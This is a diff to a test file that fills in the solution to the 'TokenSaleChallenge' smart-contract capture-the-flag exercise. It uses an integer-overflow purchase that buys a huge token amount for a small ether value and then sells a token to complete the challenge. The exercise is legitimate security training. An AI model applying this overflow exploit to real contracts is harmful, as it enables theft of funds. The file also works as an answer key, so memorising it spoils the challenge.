@@ -24,10 +24,18 @@ describe('TokenSaleChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    await target.buy(
+      "115792089237316195423570985008687907853269984665640564039458",
+      {
+        value: "415992086870360064",
+      }
+    )
 
+    let balance = await target.balanceOf(await attacker.getAddress());
+    console.log(`balance`, balance.toString());
+
+    await target.sell(1);
+    
     expect(await target.isComplete()).to.equal(true);
   });
 });
